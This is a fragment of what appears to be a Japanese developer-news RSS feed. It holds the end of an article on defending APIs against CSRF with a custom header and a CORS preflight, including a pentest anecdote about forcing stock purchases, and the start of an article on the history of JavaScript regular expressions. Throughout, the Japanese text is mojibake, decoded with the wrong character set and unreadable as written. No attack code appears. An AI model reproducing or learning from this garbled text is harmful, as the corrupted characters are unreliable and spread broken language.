<p>APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¨ã—ã¦<code class="language-text">https://api.example.com/users/delete/[ID]</code>ãŒã‚ã‚‹ã¨ã—ã¾ã™ã€‚ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã¨ã€[ID]ã‚’IDã¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰å‰Šé™¤ã•ã‚Œã¾ã™ã€‚æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚å…ˆã»ã©ã®URLã«å¯¾ã—ã€èªè¨¼æƒ…å ±ã‚’å«ã‚ãŸAjaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚<code class="language-text">example.com</code>ã®ç®¡ç†è€…ãŒãã®æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå®Ÿè¡Œã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå‰Šé™¤ã•ã‚Œã¾ã™ã€‚</p>
<p>ã“ã†ã—ãŸæ”»æ’ƒã‚’é˜²ããŸã‚ã®å›é¿ç­–ã¨ã—ã¦ã€CORSãƒã‚§ãƒƒã‚¯ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€<strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å‰ã«</strong>CORSãƒã‚§ãƒƒã‚¯ã‚’å¼·åˆ¶ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å ´åˆã€ãã‚Œã‚’è¡Œã†å”¯ä¸€ã®æ–¹æ³•ã¯ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã™ã€‚ä»¥ä¸‹ã«æ‰‹é †ã‚’ç¤ºã—ã¾ã™ã€‚</p>
<ol>
<li>ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã€è©²å½“ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã—ã¾ã™ï¼ˆã‚ãªãŸã®APIã«å¯¾ã—ã¦è¡Œã‚ã‚Œã‚‹ã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã—ã¦ã‚‚ã„ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚ãƒ˜ãƒƒãƒ€ãƒ¼ã®åå‰ã¨å€¤ã¯ä»»æ„ã§æ§‹ã„ã¾ã›ã‚“ã€‚ã“ã“ã§ã¯ä¾‹ã¨ã—ã¦ã€ŒX-Requested-With: XMLHttpRequestã€ã‚’ãƒ˜ãƒƒãƒ€ãƒ¼ã¨ã—ã¾ã™ã€‚</li>
<li>APIå´ã§ã¯ã€æ–°ã—ã„ãƒ˜ãƒƒãƒ€ãƒ¼ï¼ˆX-Requested-Withï¼‰ãŒå„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å­˜åœ¨ã™ã‚‹ã“ã¨ã‚’å¿…ãšç¢ºèªã™ã‚‹ã‚ˆã†ãªè¨­å®šã«ã—ã¾ã™ã€‚å­˜åœ¨ã—ãªã„å ´åˆã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä¸­æ–­ã—ã€ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¿”ã—ã¾ã™ã€‚</li>
</ol>
<p>å…ˆã»ã©ã®ã‚ˆã†ã«æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã—ãŸã„å ´åˆã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã¨ã—ã¦<strong>X-Requested-With</strong>ã‚’è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€ã‚ãªãŸã®APIã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚ã‚ãªãŸã®CORSãƒãƒªã‚·ãƒ¼ãŒæœ€é©ãªæ–¹æ³•ã§å®šç¾©ã•ã‚Œã¦ã„ã‚Œã°ã€<strong>Access-Control-Allow-Origin</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã«æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®åå‰ã¯å«ã¾ã‚Œã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€CORSãƒã‚§ãƒƒã‚¯ã¯å¤±æ•—ã—ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¾ã›ã‚“ã€‚</p>
<p>ã“ã®ãƒˆãƒªãƒƒã‚¯ã¯ã€GETã¨POSTä¸¡æ–¹ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’CSRFæ”»æ’ƒã‹ã‚‰å®ˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p><strong>ã¡ãªã¿ã«ã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¤‰æ›´ã‚’åŠ ãˆã‚‹ã®ã¯é¿ã‘ã‚‹ã¹ãã§ã™ã€‚GETã¯ã‚ãã¾ã§ã‚‚ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹ãŸã‚ã ã‘ã«ä½¿ç”¨ã™ã‚‹ã¹ãã§ã‚ã‚Šã€ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“</strong>ã€‚</p>
<h2>è¨­å®šãƒŸã‚¹ã§å¢“ç©´ã‚’æ˜ã‚‰ãªã„</h2>
<p>SOPã®ä»•çµ„ã¿ã¯ã€æœ€åˆã‹ã‚‰ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é˜²ãã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€è„†å¼±ãªCORSãƒãƒªã‚·ãƒ¼ã‚’å®šç¾©ã™ã‚‹ã“ã¨ã§è‡ªã‚‰ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å±é™ºãªçŠ¶æ…‹ã«æ™’ã™ã“ã¨ã®ãªã„ã‚ˆã†ã«ã—ã¾ã—ã‚‡ã†ã€‚</p>
<p>ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿå¯†æ€§ã®é«˜ã•ã«ã‚ˆã£ã¦ã¯ã€CORSã®è¨­å®šãƒŸã‚¹ã«ã‚ˆã‚Šå£Šæ»…çš„ãªè¢«å®³ã‚’å—ã‘ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚æ•°å¹´å‰ã€ã‚ã‚‹å–å¼•ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ä¾µå…¥ãƒ†ã‚¹ãƒˆã‚’è¡Œã£ãŸéš›ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®CORSãƒãƒªã‚·ãƒ¼ãŒéå¸¸ã«ç”˜ã„ã“ã¨ã«æ°—ã¥ãã¾ã—ãŸã€‚ãƒªã‚¹ã‚¯ã‚’ç¤ºã™ãŸã‚ã€ã‚µã‚¤ãƒˆã®è¨ªå•è€…ã«ç‰¹å®šã®æ ªã‚’å¼·åˆ¶çš„ã«è²·ã‚ã›ã‚‹æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã—ãŸã€‚æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’ä½¿ã£ã¦é¡§å®¢ã«ç‰¹å®šã®æ ªã‚’å¼·åˆ¶çš„ã«è²·ã‚ã›ã‚‹ã“ã¨ã§ã€æ ªä¾¡ã‚’åŠã‚Šä¸Šã’ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å•é¡Œã‚’ã†ã¾ãæ‚ªç”¨ã™ã‚Œã°ã€å„„ä¸‡é•·è€…ã«ãªã‚Œã¾ã™ã€‚</p>
<p>çŠ¯ç½ªã¯å‰²ã‚Šã«åˆã‚ãªã„ã¨è¨€ã†äººãŸã¡ã¯ã€ãã£ã¨CORSã‚’ç†è§£ã—ã¦ã„ãªã„ã®ã§ã—ã‚‡ã†ã€‚</p>
<p>ã‚¿ã‚°ä»˜ã‘ã•ã‚ŒãŸè¨˜äº‹ï¼š<a href="https://www.devsecurely.com/blog/tag/checklist">checklist</a>, <a href="https://www.devsecurely.com/blog/tag/cors">CORS</a>, <a href="https://www.devsecurely.com/blog/tag/web-application-security">web application security</a></p>]]></content:encoded></item><item><title><![CDATA[é€²åŒ–ã—ãŸæ­£è¦è¡¨ç¾ï¼šJavaScriptã®æ­£è¦è¡¨ç¾ã®æ­´å²ã¨æœªæ¥]]></title><description><![CDATA[ã‚¯ã‚¤ãƒƒã‚¯ã‚µãƒãƒªãƒ¼ï¼šä»¥å‰ã¯ã€JavaScriptã®æ­£è¦è¡¨ç¾ã¯ä»–ã®è¨€èªã®æ­£è¦è¡¨ç¾ã«æ¯”ã¹ã¦ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒåŠ£ã£ã¦ã„ãŸã‚‚ã®ã®ã€è¿‘å¹´æ”¹è‰¯ãŒé‡ã­ã‚‰ã‚Œã€ä»–ã®è¨€èªã«è¦‹åŠ£ã‚Šã—ãªããªã£ã¦ã„ã¾ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€Steveâ€¦]]></description><link>https://postd.cc/history-future-regular-expressions-javascript/</link><guid isPermaLink="false">https://postd.cc/history-future-regular-expressions-javascript/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[JavaScript]]></category><category><![CDATA[æ­£è¦è¡¨ç¾]]></category><pubDate>Thu, 12 Dec 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>ã‚¯ã‚¤ãƒƒã‚¯ã‚µãƒãƒªãƒ¼</strong>ï¼šä»¥å‰ã¯ã€JavaScriptã®æ­£è¦è¡¨ç¾ã¯ä»–ã®è¨€èªã®æ­£è¦è¡¨ç¾ã«æ¯”ã¹ã¦ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒåŠ£ã£ã¦ã„ãŸã‚‚ã®ã®ã€è¿‘å¹´æ”¹è‰¯ãŒé‡ã­ã‚‰ã‚Œã€ä»–ã®è¨€èªã«è¦‹åŠ£ã‚Šã—ãªããªã£ã¦ã„ã¾ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€Steven Levithanæ°ãŒJavaScriptã®æ­£è¦è¡¨ç¾ã®æ­´å²ã¨ç¾çŠ¶ã‚’è©•ä¾¡ã—ã€ã‚ˆã‚Šèª­ã¿ã‚„ã™ãã€ä¿å®ˆæ€§ã¨ãƒ¬ã‚¸ãƒªã‚¨ãƒ³ã‚¹ã«å„ªã‚ŒãŸæ­£è¦è¡¨ç¾ã®æ›¸ãæ–¹ã‚’ã‚¢ãƒ‰ãƒã‚¤ã‚¹ã—ã¾ã™ã€‚</p>
<hr>
<p>ãƒ¢ãƒ€ãƒ³JavaScriptã®æ­£è¦è¡¨ç¾ã¯ã€çš†ã•ã‚“ãŒã‚ˆãçŸ¥ã£ã¦ã„ã‚‹å¾“æ¥ã®æ­£è¦è¡¨ç¾ã¨æ¯”ã¹ã‚‹ã¨éšåˆ†é€²åŒ–ã—ã¾ã—ãŸã€‚æ­£è¦è¡¨ç¾ã¯<strong>ãƒ†ã‚­ã‚¹ãƒˆã‚’æ¤œç´¢ã—ã¦ç½®ãæ›ãˆã‚‹ãƒ„ãƒ¼ãƒ«ã¨ã—ã¦éå¸¸ã«å„ªã‚Œã¦ã„ã‚‹</strong>ä¸€æ–¹ã§ã€æ›¸ãã®ã‚‚ç†è§£ã™ã‚‹ã®ã‚‚é›£ã—ã„ã¨ã„ã†æ ¹å¼·ã„è©•åˆ¤ãŒã‚ã‚Šã¾ã™ï¼ˆã—ã‹ã—ä»Šã‹ã‚‰èª¬æ˜ã™ã‚‹ã‚ˆã†ã«ã€ã“ã®èªè­˜ã¯æ™‚ä»£é…ã‚Œã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚</p>
<p>æ­£è¦è¡¨ç¾ã«é–¢ã™ã‚‹ã“ã®èªè­˜ã¯ã€JavaScriptã«ç‰¹ã«å½“ã¦ã¯ã¾ã‚Šã¾ã™ã€‚PCREã‚„Perlã€.NETã€Javaã€Rubyã€C++ã€Pythonã¨ã„ã£ãŸã‚ˆã‚Šãƒ¢ãƒ€ãƒ³ãªè¨€èªã®æ­£è¦è¡¨ç¾ã«æ¯”ã¹ã¦ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒåŠ£ã‚‹JavaScriptã®æ­£è¦è¡¨ç¾ã¯ã€é•·å¹´äººæ°—ãŒä½è¿·ã—ã¦ã„ã¾ã—ãŸã€‚ã—ã‹ã—ãã‚Œã¯ã‚‚ã¯ã‚„éå»ã®è©±ã§ã™ã€‚</p>
<p>ã“ã®è¨˜äº‹ã§ã¯ã€JavaScriptã®æ­£è¦è¡¨ç¾ãŒçµŒã¦ããŸæ”¹è‰¯ã®æ­´å²ã‚’èª¬æ˜ã—ï¼ˆãƒã‚¿ãƒãƒ¬ï¼šES2018ã¨ES2024ãŒå¤§ããªè»¢æ©Ÿã¨ãªã‚Šã¾ã—ãŸï¼‰ã€ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾ã®æ©Ÿèƒ½ã‚’å®Ÿä¾‹ã¨ã¨ã‚‚ã«ç´¹ä»‹ã—ã¾ã™ã€‚ã•ã‚‰ã«ã€JavaScriptã®æ­£è¦è¡¨ç¾ã‚’ä»–ã®ãƒ¢ãƒ€ãƒ³ãªè¨€èªã®æ­£è¦è¡¨ç¾ã«åŒ¹æ•µã™ã‚‹ã€ã‚ã‚‹ã„ã¯å‹ã‚‹ã‚‚ã®ã«ã—ãŸè»½é‡ãª<a href="https://github.com/slevithan/regex">JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒª</a>ã«ã¤ã„ã¦ç´¹ä»‹ã—ã€æœ€å¾Œã«JavaScriptã®ä»Šå¾Œã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§æ­£è¦è¡¨ç¾ã‚’æ”¹è‰¯ã—ç¶šã‘ã‚‹ãŸã‚ã«ç¾åœ¨æ¤œè¨ã•ã‚Œã¦ã„ã‚‹ææ¡ˆã‚’ã„ãã¤ã‹ãŠè¦‹ã›ã—ã¾ã™ï¼ˆä¸­ã«ã¯ç¾åœ¨ãŠä½¿ã„ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«ã™ã§ã«å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹ã‚‚ã®ã‚‚ã‚ã‚Šã¾ã™ï¼‰ã€‚</p>
<h2>JavaScriptã«ãŠã‘ã‚‹æ­£è¦è¡¨ç¾ã®æ­´å² <a href="#JavaScriptã«ãŠã‘ã‚‹æ­£è¦è¡¨ç¾ã®æ­´å²ç•¥ã®ç›®çš„">#</a><a name="JavaScriptã«ãŠã‘ã‚‹æ­£è¦è¡¨ç¾ã®æ­´å²"></a></h2>
<p>1999å¹´ã«æ¨™æº–åŒ–ã•ã‚ŒãŸECMAScript 3ã¯ã€Perlç”±æ¥ã®æ­£è¦è¡¨ç¾ã‚’JavaScriptã«å°å…¥ã—ã¾ã—ãŸã€‚å¤§å¹…ãªæ”¹è‰¯ãŒåŠ ã‚ã‚Šã€æ­£è¦è¡¨ç¾ã¯ã‹ãªã‚Šä¾¿åˆ©ã«ãªã‚Šã¾ã—ãŸãŒï¼ˆä»–ã®ã»ã¨ã‚“ã©ã®Perlç”±æ¥ã®æ­£è¦è¡¨ç¾ã¨ã‚‚äº’æ›æ€§ã‚’å¾—ã¾ã—ãŸï¼‰ã€ãã‚Œã§ã‚‚ã„ãã¤ã‹å¤§ããªæ¼ã‚ŒãŒã‚ã‚Šã¾ã—ãŸã€‚JavaScriptã®æ¬¡ã«æ¨™æº–åŒ–ã•ã‚ŒãŸãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã‚ã‚‹ES5ãŒç™»å ´ã™ã‚‹ã¾ã§10å¹´ã‹ã‹ã‚Šã¾ã—ãŸãŒã€ãã®é–“ã«ä»–ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã¨æ­£è¦è¡¨ç¾ã®å®Ÿè£…ã«ã„ãã¤ã‹ä¾¿åˆ©ãªæ©Ÿèƒ½ãŒæ–°ãŸã«è¿½åŠ ã•ã‚Œã€ãã‚Œã‚‰ã®æ­£è¦è¡¨ç¾ã¯ã‚ˆã‚Šå¼·åŠ›ã§èª­ã¿ã‚„ã™ããªã‚Šã¾ã—ãŸã€‚</p>
<p>ã—ã‹ã—ãã‚Œã¯å½“æ™‚ã®è©±ã§ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>JavaScriptã®æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒå‡ºã‚‹ã¨ã€ã»ã¼æ¯å›æ­£è¦è¡¨ç¾ã«ä½•ã‚‰ã‹ã®æ”¹è‰¯ãŒè¡Œã‚ã‚Œã¦ã„ãŸã“ã¨ã‚’ã”å­˜çŸ¥ã§ã—ãŸã‹ï¼Ÿ</p></div></div>
<p>ã§ã¯å®Ÿéš›ã«è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<p>ä»¥ä¸‹ã®æ©Ÿèƒ½ã®ä¸­ã«ã¯ç†è§£ã—ã«ãã„ã‚‚ã®ã‚‚ã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€ã”å¿ƒé…ãªãã€‚ä¸»è¦ãªæ©Ÿèƒ½ã®ã„ãã¤ã‹ã¯å¾Œã§è©³ã—ãèª¬æ˜ã—ã¾ã™ã€‚</p>
<ul>
<li>ES5ï¼ˆ2009ï¼‰ã§ã¯ã€æ­£è¦è¡¨ç¾ã®ãƒªãƒ†ãƒ©ãƒ«æ–‡å­—ãŒè©•ä¾¡ã•ã‚Œã‚‹ãŸã³ã«æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½œæˆã•ã‚Œã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€ç›´æ„Ÿçš„ã§ãªã„æŒ¯ã‚‹èˆã„ãŒä¿®æ­£ã•ã‚Œã€æ­£è¦è¡¨ç¾ã®ãƒªãƒ†ãƒ©ãƒ«æ–‡å­—ãŒæ–‡å­—ã‚¯ãƒ©ã‚¹å†…ã§ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã›ãšã«ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸï¼ˆ<code class="language-text">/[/]/</code>ï¼‰ã€‚</li>
<li>ES6/ES2015ã§ã¯2ã¤ã®æ­£è¦è¡¨ç¾ãƒ•ãƒ©ã‚°ãŒæ–°ãŸã«è¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ãƒ‘ãƒ¼ã‚µãƒ¼ã§æ­£è¦è¡¨ç¾ã‚’ä½¿ã„ã‚„ã™ãã—ãŸ<code class="language-text">y</code>ï¼ˆ<code class="language-text">sticky</code>ï¼‰ã¨ã€å³æ ¼ãªã‚¨ãƒ©ãƒ¼ã¨ã¨ã‚‚ã«Unicodeé–¢é€£ã®ã„ãã¤ã‹ã®é‡è¦ãªæ”¹è‰¯ã‚’è¿½åŠ ã—ãŸ<code class="language-text">u</code>ï¼ˆ<code class="language-text">unicode</code>ï¼‰ã§ã™ã€‚ã¾ãŸã€<code class="language-text">RegExp.prototype.flags</code>ã‚²ãƒƒã‚¿ãƒ¼ã€<code class="language-text">RegExp</code>ã®ã‚µãƒ–ã‚¯ãƒ©ã‚¹åŒ–å¯¾å¿œã€ãƒ•ãƒ©ã‚°ã‚’å¤‰æ›´ã—ãªãŒã‚‰æ­£è¦è¡¨ç¾ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹æ©Ÿèƒ½ã‚‚è¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚</li>
<li>ES2018ã§ã€JavaScriptã®æ­£è¦è¡¨ç¾ã¯ã‹ãªã‚Šæ”¹è‰¯ã•ã‚Œã¾ã—ãŸã€‚<code class="language-text">s</code>ï¼ˆ<code class="language-text">dotAll</code>ï¼‰ãƒ•ãƒ©ã‚°ã€å¾Œèª­ã¿ã€åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã€Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆES6ã®<code class="language-text">u</code>ãƒ•ãƒ©ã‚°ã‚’å¿…è¦ã¨ã™ã‚‹<code class="language-text">\p{...}</code>ã¨<code class="language-text">\P{...}</code>ã«ã‚ˆã‚ŠæŒ‡å®šï¼‰ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚å¾Œã§èª¬æ˜ã™ã‚‹ã‚ˆã†ã«ã€ã“ã‚Œã‚‰ã¯ã™ã¹ã¦æ¥µã‚ã¦ä¾¿åˆ©ãªæ©Ÿèƒ½ã§ã™ã€‚</li>
<li>ES2020ã§ã¯ã€æ–‡å­—åˆ—ãƒ¡ã‚½ãƒƒãƒ‰ã®<code class="language-text">matchAll</code>ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã«ã¤ã„ã¦ã‚‚å¾Œã»ã©èª¬æ˜ã—ã¾ã™ã€‚</li>
<li>ES2022ã§ã¯ã€ãƒãƒƒãƒã—ãŸã‚µãƒ–æ–‡å­—åˆ—ãŒé–‹å§‹ã¨çµ‚äº†ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’å–å¾—ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹<code class="language-text">d</code>ï¼ˆ<code class="language-text">hasIndices</code>ï¼‰ãƒ•ãƒ©ã‚°ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚</li>
<li>æœ€å¾Œã«ã€ES2024ã§ã¯ES6ã§å®Ÿè£…ã•ã‚ŒãŸ<code class="language-text">u</code>ãƒ•ãƒ©ã‚°ã®ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã¨ã—ã¦<code class="language-text">v</code>ï¼ˆ<code class="language-text">unicodeSets</code>ï¼‰ãƒ•ãƒ©ã‚°ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã¯ã€è¤‡æ•°æ–‡å­—ã«ã‚ˆã‚‹ä¸€é€£ã®ã€Œæ–‡å­—åˆ—ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ã‚’<code class="language-text">\p{...}</code>ã«è¿½åŠ ã—ã€<code class="language-text">\p{...}</code>ã¨<code class="language-text">\q{...}</code>ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—ã‚¯ãƒ©ã‚¹å†…ã«è¤‡æ•°æ–‡å­—ã®ã‚¨ãƒ¬ãƒ¡ãƒ³ãƒˆã‚’è¿½åŠ ã™ã‚‹ã»ã‹ã€ãƒã‚¹ãƒˆã—ãŸæ–‡å­—ã‚¯ãƒ©ã‚¹ã€å·®é›†åˆ<code class="language-text">[A--B]</code>ã€ç©é›†åˆ<code class="language-text">[A&amp;&amp;B]</code>ã‚’è¿½åŠ ã—ã€æ–‡å­—ã‚¯ãƒ©ã‚¹å†…ã«ç•°ãªã‚‹ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—è¦å‰‡ã‚’è¿½åŠ ã—ã¾ã™ã€‚ã¾ãŸã€å¦å®šé›†åˆ<code class="language-text">[^...]</code>å†…ã«ãŠã‘ã‚‹Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®å¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ã—ãªã„ãƒãƒƒãƒãƒ³ã‚°ã‚‚ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚</li>
</ul>
<p>ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã¯ã€ç¾æ™‚ç‚¹ã§å®‰å…¨ã«ã‚³ãƒ¼ãƒ‰ã«çµ„ã¿è¾¼ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚‰ã®ä¸­ã§æœ€æ–°ã®æ©Ÿèƒ½ã§ã‚ã‚‹<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã¯ã€Node.js 20ãŠã‚ˆã³<a href="https://caniuse.com/mdn-javascript_builtins_regexp_unicodesets">2023å¹´ä¸–ä»£</a>ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚ãã®ä»–ã®æ©Ÿèƒ½ã¯2021å¹´ä»¥å‰ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>ES2019ã‹ã‚‰ES2023ã¾ã§ã®å„ã‚¨ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã§ã¯ã€<code class="language-text">\p{...}</code>ã¨<code class="language-text">\P{...}</code>ã«ã‚ˆã‚ŠæŒ‡å®šå¯èƒ½ãªUnicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚‚æ–°ãŸã«è¿½åŠ ã•ã‚Œã¦ã„ã¾ã™ã€‚ã•ã‚‰ã«ã€ES2021ã§ã¯æ–‡å­—åˆ—ãƒ¡ã‚½ãƒƒãƒ‰<code class="language-text">replaceAll</code>ã‚‚è¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ãŸã ã—ã€æ­£è¦è¡¨ç¾ã‚’æ¸¡ã•ã‚ŒãŸéš›ã®æŒ™å‹•ã§ES3ã®<code class="language-text">replace</code>ã¨å”¯ä¸€ç•°ãªã‚‹ç‚¹ã¯ã€<code class="language-text">g</code>ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ã„ãªã„å ´åˆã«ä¾‹å¤–ã‚’ã‚¹ãƒ­ãƒ¼ã™ã‚‹ã“ã¨ã§ã™ã€‚</p>
<h2>ä½™è«‡ï¼šæ­£è¦è¡¨ç¾ã®è‰¯ã—æ‚ªã—ã¯ä½•ã§æ±ºã¾ã‚‹ï¼Ÿ <a href="#ä½™è«‡ï¼šæ­£è¦è¡¨ç¾ã®è‰¯ã—æ‚ªã—ã¯ä½•ã§æ±ºã¾ã‚‹ï¼Ÿ">#</a><a name="ä½™è«‡ï¼šæ­£è¦è¡¨ç¾ã®è‰¯ã—æ‚ªã—ã¯ä½•ã§æ±ºã¾ã‚‹ï¼Ÿ"></a></h2>
